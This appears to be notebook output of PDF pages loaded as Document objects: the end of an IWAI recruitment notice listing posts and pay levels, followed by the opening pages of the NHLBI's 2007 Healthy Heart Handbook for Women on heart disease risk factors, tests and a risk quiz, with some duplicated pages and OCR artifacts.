2 UR – 1 ( Mechanical)  \\n                  OBC – 1 ( Civil)  \\n \\n2 02/24  Assistant \\nHydrographic  \\nSurveyor (AHS)  Level – 10 \\n(Pay Range) \\n56100 -\\n177500)  Not \\nexceeding \\n35 years  1 1 - - - - - - \\n3 03//24  Licence Engine \\nDriver  Level – 6 \\n(Pay Range) \\n35400 -\\n112400)  Not \\nexceeding \\n30 years  1 1 - - - - - - \\n4 04/24  Junior Accounts \\nOfficer  Level – 6 \\n(Pay Range) \\n35400 -\\n112400)  Not \\nexceeding \\n30 years  5 1 2 1 1 - 1* - \\n5 05/24  Dredge Control \\nOperator  Level – 6 \\n(Pay Range) \\n35400 -\\n112400)  Not \\nexceeding \\n30 years  5 2 1 1 1 - - - \\n6 06/24  Store Keeper  Level –4  \\n(Pay Range \\n25500 -\\n81100)  Not \\nexceeding \\n25 years  1 1 - - - - - - \\n7 07/24  Master  2nd \\nClass  Level –4  \\n(Pay Range \\n25500 -\\n81100)  Not \\nexceeding \\n35 years  3 1 - - 1 1 - - \\n8 08/24  Staff  Car Driver  Level – 02 \\n (Pay Range \\n19900 -\\n63200)  Not \\nexceeding \\n30 years  3 2 1 - - - - - \\n9 09/24  Master 3rd \\nClass  Level – 02 \\n (Pay Range \\n19900 -\\n63200)  Not \\nexceeding \\n30 years  1 1 - - - - - - \\nIMPORTANT NOTICE : - Only online applications will be accepted. Application received through any other \\nmode shall stand rejected automatically.  \\nOpening Date of Application: 16/08/2024  \\nClosing Date of Application:  15/09/2024  \\n '),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/1114363837233349487393 (1).pdf', 'page': 1}, page_content='  10 10/24  Multi Tasking \\nStaff (MTS)  Level -01 \\n(Pay Range \\n18000 -\\n56900)  Between \\n18 and 25 \\nyears  11 2 4 3 1 1 2* - \\n11 11/24  Technical \\nAssistant  \\n(Civil/  \\nMechanical/ \\nMarine \\nEngineering/ \\nNaval \\nArchitecture  \\n Level – 6 \\n(Pay Range) \\n35400 -\\n112400)  Not \\nexceeding \\n30 years  4 UR – 2 ( 1- Civil & 1 - Mechanical)  \\nOBC – 1 (1- Marine Engineering)  \\nST – 1 (1- Naval Architecture)  \\n \\n \\n(*) If PwD candidate is selected, will be adjusted against the quota as per his/her category.   \\n \\nPhysical Requirements and Suitable Category of Benchmark Disability:  \\nPost  Physical Requirement  Disability suitable for the job  \\nJunior Account Officer  S, ST, MF, RW, SE, C  c) - OA, OL,BL, BA, OAL,  \\nCP, LC, Dw, AAV, MDy, SD (witho ut N/L \\nDf), SI (without N/L Df) - 01 Post  \\nMulti Tasking Staff (MTS)  S, ST, W, MF, RW, SE, C  a) - B, LV  – 01 Post  \\nc) - OA, OL,BL, BA, OAL,  \\nCP, LC, Dw, AAV, MDy, SD (witho ut N/L \\nDf), SI (without N/L Df) – 01 Post  \\n \\nAbbreviations used for physical Requirement:  \\nS- Sitting, ST= Standing, W= Walking, MF= Manipulation by Fingers, RW= Reading & Writing, SE= \\nSeeing, C= Communication  \\nAbbreviations used for categories:  \\nB= Blind, LV= Low Vision,  \\nOA= One Arm, OL= One Leg, BL= Both Leg, BA= Both Arm, OAL= One Arm and One Leg, CP= \\nCerebral Palsy, LC= Leprosy Cured, Dw= Dwarfism, AAV= Acid Attack Victims, MDy= Muscular \\nDystrophy, SD/SI (without N/L Df)= Spinal Deformity / Spinal Injury (without Neurological / Limb \\ndysfunction) . \\nInterested candidates possessing requisite qualifications and experience may  submit applications \\nonline using link, which shall be available in the IWAI web -site i.e. www.iwai.nic.in ; w.e.f  \\n16/08/2024.  Last date for payment of Application Fee and  submission of online application \\nis 15/09/2024 (23:59 Hrs.) . \\n  \\nDetailed advertisement shall be available on IWAI website ( www.iwai.nic.in ) on 16/08/2024. \\n \\n \\nSd/- \\nSECRETARY  \\n \\n \\n \\n \\n \\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 0}, page_content='THE HEALTHY \\nHANDBOOK FOR WOMEN �ear� '),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 1}, page_content='The National Heart, Lung, and Blood Institute (NHLBI) would like to express its\\ngratitude to all of the women whose pictures and stories appear in this handbook.They have shared their stories from the heart to help other women understand thatheart disease is not just a statistic, but a disease that affects the lives of realwomen, of all ages and backgrounds, in every community in our country.  \\nWe are also pleased to announce that this edition of “The Healthy\\nHeart Handbook for Women” marks the 20th anniversary of this\\npublication.  Since the first edition rolled off the presses in 1987, this best-selling NHLBI book has reached hundreds of thousands ofwomen with a vital, empowering message:  You can take action toprotect your heart health.  As always, we hope that the stories ofcourage and healing in these pages will continue to inspire readersto act to protect their own health and well being.  Thank you!  '),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 2}, page_content='THE HEALTHY /h1ear/t1 HANDBOOK FOR WOMEN'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 3}, page_content='Mrs. Laura Bush, National Ambassador for The Heart Truth'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 4}, page_content=''),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 5}, page_content='Written by:  Marian Sandmaier\\nNIH Publication No.  07-2720 \\nOriginally printed 1987Previously revised 1992, 1997, 2003, 2005Revised March 2007'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 6}, page_content='TABLE OFcon/t1en/t1s\\nABOUT THIS NEW EDITION — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 7\\nTHE HEART TRUTH — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 8\\nGETTING THE WORD OUT — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 10\\nWHAT IS HEART DISEASE? — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 11\\nWOMEN AT RISK — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 12\\nEvery Risk Factor Counts — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 13\\nFINDING OUT YOUR RISK — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 15\\nYou and Your Doctor:  A Heart Healthy Partnership — — — — — — — — — — — — — — 15\\nMAJOR RISK FACTORS FOR HEART DISEASE — — — — — — — — — — — — — — — — 21\\nSmoking — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 21\\nHigh Blood Pressure — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 22\\nHigh Blood Cholesterol — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 29\\nOverweight and Obesity — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 38\\nPhysical Inactivity — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 42\\nDiabetes — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 43\\nOTHER FACTORS THAT AFFECT HEART DISEASE — — — — — — — — — — — — — — 49\\nMenopausal Hormone Therapy:  What Every Woman Needs To Know — — — — 49\\nStress and Depression — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 52\\nAlcohol — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 55\\nBirth Control Pills — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 56\\nSleep Apnea — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 58\\nTAKING CONTROL — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 60\\nA FAMILY PLAN FOR HEART HEALTH — — — — — — — — — — — — — — — — — — — — — — 61\\nAN ACTION PLAN FOR HEART HEALTH — — — — — — — — — — — — — — — — — — — — 62\\nEat for Health — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 63\\nAim for a Healthy Weight — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 83\\nLearn New Moves — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 94\\nYou CanStop Smoking — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 101\\nFOR WOMEN WHO HAVE HEART DISEASE — — — — — — — — — — — — — — — — 107\\nScreening Tests — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 107\\nMedications — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 112\\nSpecial Procedures — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 114\\nGETTING HELP FOR A HEART ATTACK — — — — — — — — — — — — — — — — — — — — 115\\nKnow the Warning Signs — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 115\\nGet Help Quickly — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 116\\nPlan Ahead — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 117\\nTHE HEART OF THE MATTER — — — — — — — — — — — — — — — — — — — — — — — — — — — — 119\\nHOW TO ESTIMATE YOUR RISK — — — — — — — — — — — — — — — — — — — — — — — — 120\\nTO LEARN MORE — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 121\\n— 5 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 7}, page_content='“THE HEART TRUTH MEANS TAKING\\nCARE OF YOURSELF AND YOUR\\nHEART—INSIDE AND OUT.  IT IS A\\nLONG-TERM COMMITMENT AND GOALTO LIVE A HEALTHY\\nLIFE, ONE THAT IS\\nHARMONIOUS.”   \\n–Orlinda\\n— 6 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 8}, page_content='abou /t1THIS NEW EDITION \\nResearch on women’s heart health is exploding.  Nearly every\\nweek, it seems, the media report on new ways to prevent and treatheart disease in women—and it can be hard to keep track of it all.\\nIn this updated edition of “The Healthy Heart Handbook for\\nWomen,” we have put together all of this new knowledge in one\\neasy-to-use handbook.  This guide is part of \\nThe Heart Truth , a\\nnational public awareness campaign for women about heart\\ndisease sponsored by the National Heart, Lung, and Blood Institute\\n(NHLBI) and many other groups.  (See “Getting the Word Out” on\\npage 10.)\\n“The Healthy Heart Handbook for Women” will give you new\\ninformation on women’s heart disease and practical suggestionsfor reducing your own personal risk of heart-related problems.You’ll find out about a little-known form of heart disease in womenand how to get it diagnosed properly.  The handbook will alsohelp you make sense of widely publicized research on the impact\\nof a lower fat diet on women’s heart disease risk.\\nThere is much good news in these pages, including new findings that\\npeople who avoid heart disease risk factors tend to live healthier andlonger lives.  The handbook will give you the latest information onpreventing and controlling those risks.  You’ll also find new tips onfollowing a nutritious eating plan, tailoring your physical activity programto your particular goals, and getting your whole family involved in hearthealthy living.  The handbook will also advise you on the warning signsof heart attack, as well as how to act quickly to get help.\\nSo welcome to “The Healthy Heart Handbook for Women”—your\\none-stop source for the latest information on women’s heart diseaseand heart health.\\n— 7 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 9}, page_content='THE /h1ear/t1 TRUTHWhen you hear the term “heart disease,” \\nwhat is your first reaction?  Like many women, \\nyou may think, “That’s a man’s disease” or “Not my\\nproblem.”  But here is The Heart Truth :  Heart disease is the #1\\nkiller of women in the United States.  Most women don’t know this.\\nBut it is vital that you know it—and know what it means for you.\\nSome surprising facts:\\n■One in 4 women in the United States dies of heart disease,while 1 in 30 dies of breast cancer.\\n■Twenty-three percent of women will die within 1 year afterhaving a heart attack.\\n■Within 6 years of having a heart attack, about 46 percent ofwomen become disabled with heart failure.  Two-thirds ofwomen who have a heart attack fail to make a full recovery.\\nThe fact is, if you’ve got a heart, heart disease could be your\\nproblem.  Fortunately, it’s a problem you can do something\\nabout.  This handbook will help you find out your own risk ofheart disease and take steps to prevent and control it.\\nFor women in midlife, taking action is particularly important.  \\nOnce a woman reaches menopause, her risks of heart diseaseand heart attack jump dramatically.  One in eight women\\nbetween the ages of 45 and 64 has some form of heart disease,and this increases to one in four women over 65.\\n— 8 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 10}, page_content='One in 4 women in the United States dies \\nof heart disease, while 1 in 30 dies of breast cancer.\\nYou still may be thinking, “But this isn’t about me.  I don’t have\\nheart disease.”  But you may have conditions or habits that canlead to heart disease, such as being overweight, smoking\\ncigarettes, or not engaging in enough physical activity.  You \\nmay already know about these and other “risk factors” for heartdisease.  You may know which ones you personally have.  What you may not know, though, is that if you have even onerisk factor, you are much more likely to develop heart disease,with its many serious consequences.  A damaged heart candamage your life by interfering with enjoyable activities andeven your ability to do simple things, such as taking a walk or climbing steps.\\nBut now here’s the good news:  You have tremendous power to\\nprevent heart disease—and you can start today.  By learningabout your own personal risk factors and by making healthfulchanges in your diet, physical activity, and other daily habits,you can greatly reduce your risk of developing heart-relatedproblems.  Even if you already have heart disease, you can takesteps to lessen its severity.\\nSo use this handbook to learn more about heart healthy living.\\nTalk with your physician to get more answers.  Start taking actiontoday to protect your heart.  As one woman doctor put it, “Heartdisease is a ‘now’ problem.  Later may be too late.”\\n— 9 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 11}, page_content='GETTING THE wor↙ OUT \\nChances are, you’ve been seeing and hearing a lot of\\ninformation lately on women and heart disease.  That’sbecause an exciting public awareness campaign is\\nunderway to help women protect their heart health.  The\\npurpose of this nationwide campaign, called \\nThe Heart Truth ,\\nis to spread the word that heart disease is a women’s issue.\\nThe Heart Truth warns women about heart disease and\\nencourages them to take action against its risk factors.\\nThe message is paired with an arresting image—the Red\\nDress—the national symbol for women and heart disease\\nawareness.  The symbol links a woman’s focus on her “outer self”to the need to also focus on her “inner self,” especially her hearthealth.  The Red Dress is a visual “red alert” to convey themessage that “Heart Disease Doesn’t Care What You Wear—It’sthe #1 Killer of Women.”\\nThe Heart Truth campaign is sponsored by the National Heart,\\nLung, and Blood Institute in partnership with many national and\\ncommunity health organizations around the country.  So the next\\ntime you come across a red dress, or a newspaper article or local\\nspeaker on women and heart disease, take the time to get themessage.  \\nThe Heart Truth :  It could save your life.\\nFor more information, visit the campaign’s Web pages at\\nwww.hearttruth.gov.\\n— 10 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 12}, page_content='WHAT IS /h1ear/t1 DISEASE? \\nCoronary heart disease—often simply called heart disease—\\noccurs when the arteries that supply blood to the heart musclebecome hardened and narrowed due to a buildup of plaque on\\nthe arteries’ inner walls.  Plaque is the accumulation of fat,\\ncholesterol, and other substances.  As plaque continues to buildup in the arteries, blood flow to the heart is reduced.\\nHeart disease can lead to a heart attack.  A heart attack\\nhappens when an artery becomes totally blocked with plaque,preventing vital oxygen and nutrients from getting to the heart.A heart attack can cause permanent damage to the heart muscle.\\nHeart disease is one of several cardiovascular diseases, which\\nare diseases of the heart and blood vessel system.  Othercardiovascular diseases include stroke, high blood pressure, and rheumatic heart disease.\\nOne reason some women aren’t too concerned about heart\\ndisease is that they think it can be “cured” with surgery.  This isa myth.  Heart disease is a lifelong condition—once you get it,you’ll always have it.  True, procedures such as bypass surgeryand angioplasty can help blood and oxygen flow to the heartmore easily.  But the arteries remain damaged, which means youare more likely to have a heart attack.\\nWhat’s more, the condition of your blood vessels will steadily\\nworsen unless you make changes in your daily habits.  Manywomen die of complications from heart disease or becomepermanently disabled.  That’s why it is so vital to take action toprevent and control this disease.\\n— 11 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 13}, page_content='women AT RISK\\nRisk factors are conditions or habits that make a person more\\nlikely to develop a disease.  They also can increase the chancesthat an existing disease will get worse.  Important risk factors for\\nheart disease that you can do something about are cigarette\\nsmoking, high blood pressure, high blood cholesterol, overweight,physical inactivity, and diabetes.  Research shows that more than95 percent of those who die from heart disease have at leastone of these major risk factors.\\nSome risk factors, such as age and family history of early heart\\ndisease, can’t be changed.  For women, age becomes a riskfactor at 55.  Women who have gone through early menopause,\\neither naturally or because they have had a hysterectomy, aretwice as likely to develop heart disease as women of the sameage who have not yet gone through menopause.  Anotherreason for the increasing risk is that middle age is a time whenwomen tend to develop other risk factors for heart disease.\\nFamily history of early heart disease is another risk factor that\\ncan’t be changed.  If your father or brother had a heart attackbefore age 55, or if your mother or sister had one before age65, you are more likely to get heart disease yourself.\\nWhile certain risk factors cannot be changed, it is important to\\nrealize that you do have control over many others.  Regardlessof your age, background, or health status, you can lower yourrisk of heart disease—and it doesn’t have to be complicated.Protecting your heart can be as simple as taking a brisk walk,whipping up a good vegetable soup, or getting the support youneed to maintain a healthy weight.\\n— 12 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 14}, page_content='Every Risk Factor Counts \\nSome women believe that doing just one healthy thing will take careof all of their heart disease risk.  For example, they may think that if\\nthey walk or swim regularly, they can still smoke and stay fairly\\nhealthy.  Wrong!  To protect your heart, it is vital to make changesthat address each risk factor you have.  You can make the changesgradually, one at a time.  But making them is very important.\\nOther women may wonder, “If I have just one risk factor for heart\\ndisease—say, I’m overweight or I have high blood cholesterol—aren’t I more or less ‘safe’?”  Absolutely not.  Having just one riskfactor can double a woman’s chance of developing heart disease.\\nThe “Multiplier Effect”\\nBut having more than one risk factor is especially serious, becauserisk factors tend to “gang up” and worsen each other’s effects.Having two risk factors increases the chance of developing heartdisease fourfold.  Having three or more risk factors increases thechance more than tenfold.\\nThe fact is, most women in midlife already have heart disease\\nrisk factors.  Thirty-three percent of women ages 40 to 60 haveone risk factor for heart disease that they can change.  Another31 percent of women in midlife have two modifiable risk factors,while 17 percent have three or more modifiable risk factors.\\nWomen of color have higher rates of some risk factors.  More\\nthan 85 percent of African American women in midlife areoverweight or obese, while 52 percent have high bloodpressure, and 14 percent have been diagnosed with diabetes.Among Hispanic women in midlife, 78 percent are overweightor obese, while more than 10 percent have been diagnosed with diabetes.\\nThe message is clear:  Every woman needs to take her heart\\ndisease risk seriously—and take action now to reduce that risk.\\n— 13 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 15}, page_content='DIDyou KNOW?\\nMany women think that breast cancer is a bigger threat than\\nheart disease.  But the leading causes of death for Americanwomen in the year 2004* were:\\nHeart Disease ______________________________________________________________________ 332,313\\nCancer (all types) ________________________________________________________________ 265,022\\n■Lung __________________________________________________________________________________ 67,838\\n■Breast ________________________________________________________________________________ 40,539\\n■Colorectal ________________________________________________________________________ 26,762\\n■Pancreatic ________________________________________________________________________ 15,815\\n■Ovarian ____________________________________________________________________________ 14,593\\n■Uterine ________________________________________________________________________________ 6,906\\n■Cervical ______________________________________________________________________________ 3,804\\n■Others ______________________________________________________________________________ 88,765\\nStroke ______________________________________________________________________________________ 91,487\\nChronic Obstructive Pulmonary Disease ____________________________ 64,409\\nAlzheimer’s Disease ______________________________________________________________ 46,954\\nAccidents ________________________________________________________________________________ 38,903\\nDiabetes __________________________________________________________________________________ 37,771\\nPneumonia/Influenza ____________________________________________________________ 33,902\\n* Most recent year for which data are available.\\n— 14 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 16}, page_content='______________________________________________________________________\\n________________________________________________________________\\n__________________________________________________________________________________\\n________________________________________________________________________________\\n________________________________________________________________________\\n________________________________________________________________________\\n____________________________________________________________________________\\n________________________________________________________________________________\\n______________________________________________________________________________\\n______________________________________________________________________________\\n______________________________________________________________________________________\\n____________________________\\n______________________________________________________________\\n________________________________________________________________________________\\n__________________________________________________________________________________\\n____________________________________________________________DID you KNOW? \\nMany women think that breast cancer is a bigger threat than \\nheart disease.  But the leading causes of death for American \\nwomen in the year 2004* were: \\nHeart Disease 332,313 \\nCancer (all types) 265,022 \\n■ Lung 67,838 \\n■ Breast 40,539 \\n■ Colorectal 26,762 \\n■ Pancreatic 15,815 \\n■ Ovarian 14,593 \\n■ Uterine 6,906 \\n■ Cervical 3,804 \\n■ Others 88,765 \\nStroke 91,487 \\nChronic Obstructive Pulmonar y Disease 64,409 \\nAlzheimer’ s Disease 46,954 \\nAccidents 38,903 \\nDiabetes 37,771 \\nPneumonia/Influenza 33,902 \\n* Most recent year for which data are available. \\n— 14 — FINDING OUT you�RISK T he first step toward hear t health is becoming \\naware of your own personal risk for hear t disease. \\nSome risks, such as smoking cigarettes, are \\nobvious: Every woman knows whether or not she smokes.  \\nBut other risk factors, such as high blood pressure or high blood \\ncholesterol, generally don’ t have obvious signs or symptoms.  \\nSo you’ll need to gather some infor mation to create your personal \\n“hear t profile.”  \\nYou and Y our Doctor:  A Hear t Healthy Par tnership \\nA crucial step in deter mining your risk is to see your doctor for a \\nthorough checkup. Your physician can be an impor tant par tner \\nin helping you set and reach goals for hear t health.  But don’ t \\nwait for your doctor to mention hear t disease or its risk factors. \\nMany doctors don’ t routinely bring up the subject with women \\npatients. Research shows that women are less likely than men \\nto receive hear t healthy recommendations from their doctors. \\nHere are some tips for establishing good, clear communication \\nbetween you and your doctor: \\nSpeak up. Tell your doctor you want to keep your hear t \\nhealthy and would like help in achieving that goal. Ask \\nquestions about your chances of developing hear t disease and \\nhow you can lower your risk. (See “Questions T o Ask Y our \\nDoctor” on page 17.) Also ask for tests that will deter mine your \\npersonal risk factors. (See “Check It Out” on pages 18 and 19.) \\n— 15 — '),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 17}, page_content='Keep tabs on treatment.  If you already are being treated\\nfor heart disease or heart disease risk factors, ask your doctor to\\nreview your treatment plan with you.  Ask, “Is what I’m doing in\\nline with the latest recommendations?  Are my treatments\\nworking?  Are my risk factors under control?”  If your doctorrecommends a medical procedure, ask about its benefits andrisks.  Find out if you will need to be hospitalized and for howlong, and what to expect during the recovery period.\\nBe open.  When your doctor asks you questions, answer as\\nhonestly and fully as you can.  While certain topics may seemquite personal, discussing them openly can help your doctor find\\nout your chances of developing heart disease.  It can also helpyour doctor work with you to reduce your risk.  If you alreadyhave heart disease, briefly describe each of your symptoms.Include when each symptom started, how often it happens, andwhether it has been getting worse.\\nKeep it simple.  If you don’t understand something your\\ndoctor says, ask for an explanation in simple language.  Beespecially sure you understand how to take any medication youare given.  If you are worried about understanding what thedoctor says, or if you have trouble hearing, bring a friend orrelative with you to your appointment.  You may want to ask thatperson to write down the doctor’s instructions for you.\\n— 16 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 18}, page_content='—\\nKeep tabs on treatment. If you already are being treated \\nfor hear t disease or hear t disease risk factors, ask your doctor to \\nreview your treatment plan with you. Ask, “Is what I’m doing in \\nline with the latest recommendations? Are my treatments \\nworking? Are my risk factors under control?” If your doctor \\nrecommends a medical procedure, ask about its benefits and \\nrisks. Find out if you will need to be hospitalized and for how \\nlong, and what to expect during the recover y period. \\nBe open. When your doctor asks you questions, answer as \\nhonestly and fully as you can. While cer tain topics may seem \\nquite personal, discussing them openly can help your doctor find \\nout your chances of developing hear t disease.  It can also help \\nyour doctor work with you to reduce your risk. If you already \\nhave hear t disease, briefly describe each of your symptoms. \\nInclude when each symptom star ted, how often it happens, and \\nwhether it has been getting worse. \\nKeep it simple. If you don’ t understand something your \\ndoctor says, ask for an explanation in simple language. Be \\nespecially sure you understand how to take any medication you \\nare given. If you are worried about understanding what the \\ndoctor says, or if you have trouble hearing, bring a friend or \\nrelative with you to your appointment. You may want to ask that \\nperson to write down the doctor’ s instructions for you. \\n— 16 — QUESTIONS TO ASK YOUR docto� \\nGetting answers to these questions will give you vital infor mation \\nabout your hear t health and what you can do to improve it.  \\nYou may want to take this list to your doctor’ s office: \\n1. What is my risk for hear t disease? \\n2. What is my blood pressure? What does it mean for me, \\nand what do I need to do about it? \\n3. What are my cholesterol numbers? (These include total \\ncholesterol, LDL or “bad” cholesterol, HDL or “good” \\ncholesterol, and triglycerides.) What do they mean for me, \\nand what do I need to do about them? \\n4. What are my body mass index (BMI) and waist measurement? \\nDo they indicate that I need to lose weight for my health? \\n5. What is my blood sugar level, and does it mean I’m at risk \\nfor diabetes? \\n6. What other screening tests for hear t disease do I need? \\nHow often should I retur n for checkups for my hear t health? \\n7. What can you do to help me quit smoking? \\n8. How much physical activity do I need to help protect \\nmy hear t?\\n9. What is a hear t healthy eating plan for me?  Should I see \\na registered dietitian or qualified nutritionist to lear n more \\nabout healthy eating? \\n10. How can I tell if I’m having a hear t attack? \\n— 17 '),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 19}, page_content='chec� IT OUT \\nTests That Can Help Pr otect Y our Hear t Health \\nAsk your doctor to give you these tests. Each one will give you \\nvaluable infor mation about your hear t disease risk.  \\nLipopr otein Pr ofile \\nWhat: A blood test that measures total cholesterol, HDL or \\n“good” cholesterol, LDL or “bad” cholesterol, and triglycerides, \\nanother for m of fat in the blood.  The test is given after a 9- to \\n12-hour fast. \\nWhy: To find out if you have any of the following:  high blood \\ncholesterol (high total and LDL cholesterol), low HDL cholesterol, \\nor high triglyceride levels. All affect your risk for hear t disease. \\nWhen: All healthy adults should have their blood cholesterol \\nlevels checked at least once ever y 5 years.  Depending on the \\nresults, your doctor may want to repeat the test more frequently .  \\nBlood Pressure \\nWhat: A simple, painless test using an inflatable cuff on the ar m. \\nWhy: To find out if you have high blood pressure (also called \\nhyper tension) or prehyper tension.  Both are risk factors for hear t \\ndisease. \\nWhen: At least ever y 2 years, or more often if you have high \\nblood pressure or prehyper tension. \\n— 18 — Fasting Plasma Glucose \\nWhat: The preferred test for diagnosing diabetes. After you have \\nfasted over night, you will get a blood test the following mor ning. \\nWhy: To find out if you have diabetes or are likely to develop the \\ndisease. Fasting plasma glucose levels of more than 126 mg/dL \\non two tests on different days mean that you have diabetes. Levels \\nbetween 100 and 125 mg/dL mean you have an increased risk \\nfor diabetes and may have prediabetes. Diabetes is an impor tant \\nrisk factor for hear t disease and other medical disorders. \\nWhen: At least ever y 3 years, beginning at age 45.  If you have \\nrisk factors for diabetes, you should be tested at a younger age \\nand more often. \\nBody Mass Index (BMI) and W aist Circumference \\nWhat: BMI is a measure of your weight in relation to your height. \\nWaist circumference is a measure of the fat around your middle. \\nWhy: To find out whether your body type raises your risk of \\nheart disease.  A BMI of 25 or higher means you are over weight. \\nA BMI of 30 or higher means you are obese. Both over weight \\nand obesity are risk factors for hear t disease.  For women, a waist \\nmeasurement of more than 35 inches increases the risk of hear t \\ndisease and other serious health conditions. \\nWhen: Every 2 years, or more often if your doctor recommends it.  \\nOther T ests \\nThere also are several tests that can deter mine whether you already \\nhave hear t disease.  Ask your doctor whether you need a stress \\ntest, an electrocardiogram (EKG or ECG), or another diagnostic \\ntest. (See “Screening T ests” on page 105.) \\n— 19 — '),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 20}, page_content='Fasting Plasma Glucose\\nWhat:  The preferred test for diagnosing diabetes.  After you have\\nfasted overnight, you will get a blood test the following morning.\\nWhy: To find out if you have diabetes or are likely to develop the\\ndisease.  Fasting plasma glucose levels of more than 126 mg/dL\\non two tests on different days mean that you have diabetes.  Levelsbetween 100 and 125 mg/dL mean you have an increased riskfor diabetes and may have prediabetes.  Diabetes is an importantrisk factor for heart disease and other medical disorders.\\nWhen: At least every 3 years, beginning at age 45.  If you have\\nrisk factors for diabetes, you should be tested at a younger age\\nand more often.\\nBody Mass Index (BMI) and Waist Circumference\\nWhat: BMI is a measure of your weight in relation to your height.\\nWaist circumference is a measure of the fat around your middle.\\nWhy:  To find out whether your body type raises your risk of\\nheart disease.  A BMI of 25 or higher means you are overweight.A BMI of 30 or higher means you are obese.  Both overweightand obesity are risk factors for heart disease.  For women, a waistmeasurement of more than 35 inches increases the risk of heartdisease and other serious health conditions.\\nWhen: Every 2 years, or more often if your doctor recommends it.  \\nOther Tests\\nThere also are several tests that can determine whether you already\\nhave heart disease.  Ask your doctor whether you need a stresstest, an electrocardiogram (EKG or ECG), or another diagnostic\\ntest.  (See “Screening Tests” on page 105.)\\n— 19 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 21}, page_content='WHA T’S you�RISK? \\nHere is a quick quiz to find out your risk of a hear t attack. \\nDon’t Yes No Know \\nDo you smoke? \\nIs your blood pressure 140/90 mmHg or higher, OR \\nhave you been told by your doctor that your blood pressure is too high? \\nHas your doctor told you that your LDL (“bad”) \\ncholesterol is too high, OR that your total cholesterol level is 200 mg/dL or higher, OR that your HDL (“good”) cholesterol is less than 40 mg/dL? \\nHas your father or brother had a heart attack before age \\n55, OR has your mother or sister had one before age 65? \\nDo you have diabetes OR a fasting blood sugar of \\n126 mg/dL or higher, OR do you need medicine to control your blood sugar? \\nAre you over 55 years old? Do you have a body mass index (BMI) score of 25 \\nor more? (To find out, see page 41.) \\nDo you get less than a total of 30 minutes of \\nmoderate-intensity physical activity on most days? \\nHas a doctor told you that you have angina (chest \\npains), OR have you had a heart attack? \\nIf you checked any of the “yes” boxes, you’re at an increased risk of \\nhaving a hear t attack.  If you checked “don’ t know” for any questions, \\nask your doctor for help in answering them. Read on to lear n what \\nyou can do to lower your risk. \\n— 20 — MAJOR RISK F ACTORS FOR �ear�DISEASE A s impor tant as it is to work closely with your \\ndoctor , it is only the first step.  To make a lasting \\ndifference in 